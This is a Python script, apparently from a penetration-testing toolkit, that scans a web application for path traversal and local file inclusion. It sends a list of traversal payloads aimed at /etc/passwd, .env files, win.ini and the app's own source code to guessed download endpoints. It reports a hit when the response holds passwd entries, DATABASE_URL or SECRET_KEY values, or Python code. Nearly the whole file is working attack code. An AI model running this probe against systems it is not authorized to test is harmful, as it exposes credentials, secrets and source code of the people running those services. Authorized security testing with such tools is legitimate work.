#!/usr/bin/env python3
"""Path Traversal / LFI probe — requires real file content evidence, not just 200."""
import argparse
import os
import sys
import re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, DEFAULT_TARGET_BASE

PAYLOADS = [
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "../app.py",
    "../.env",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
]

class TraversalSniper(VibeTool):
    def __init__(self):
        super().__init__("traversal_sniper", "Path traversal / LFI probe")

    def run(self, base_url, app_root=None):
        self.banner()
        base = base_url.rstrip("/")
        baseline = self.baseline_probe(base)
        endpoints = [
            f"{base}/files",
            f"{base}/file",
            f"{base}/download",
            f"{base}/static",
            f"{base}/api/files",
            f"{base}/?path=",
            f"{base}/?file=",
        ]
        if app_root:
            # precise absolute payloads when stack traces leak the root
            depth = app_root.count("/") + 2
            PAYLOADS.extend([("../" * depth) + "app.py", app_root + "/app.py"])

        hits = []
        for ep in endpoints:
            for payload in PAYLOADS:
                if "?" in ep:
                    url = ep + payload
                else:
                    url = ep + "?path=" + payload
                status, body, _ = self.safe_request(url)
                body = body or ""
                if status != 200 or self.matches_baseline(body, baseline):
                    continue
                # Real evidence: passwd markers, env keys, or Python source
                evidence = any([
                    re.search(r"root:.*:0:0:", body),
                    "DATABASE_URL" in body or "SECRET_KEY" in body,
                    "def " in body and "import " in body,
                    "[extensions]" in body.lower(),  # win.ini
                ])
                if evidence:
                    hits.append({"url": url, "payload": payload})
                    self.log(f"TRAVERSAL CONFIRMED: {payload}", "hack")
        if not hits:
            self.log("No confirmed traversal (content evidence required)", "info")
        return hits

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=DEFAULT_TARGET_BASE)
    p.add_argument("--app-root", default=None)
    args = p.parse_args()
    TraversalSniper().run(args.url, args.app_root)
